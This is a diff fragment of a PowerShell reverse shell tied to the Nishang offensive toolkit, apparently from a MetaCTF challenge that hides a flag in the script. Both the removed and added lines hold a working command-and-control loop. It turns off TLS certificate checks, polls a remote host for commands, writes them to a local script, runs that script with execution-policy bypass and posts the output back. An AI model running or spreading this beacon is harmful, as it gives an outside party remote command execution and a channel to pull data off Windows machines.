@@ -102,7 +102,7 @@ https://github.com/samratashok/nishang
             }
             catch
             {
-                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Warning "MetaCTF{All_H04x3d_0ut}" 
                 Write-Error $_
             }
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
@@ -126,7 +126,7 @@ public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidati
 ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-$s='MetaCTF{All_H04x3d_0ut}:1337';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
+$s='MetaCTF:1337';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
     }
     catch
     {
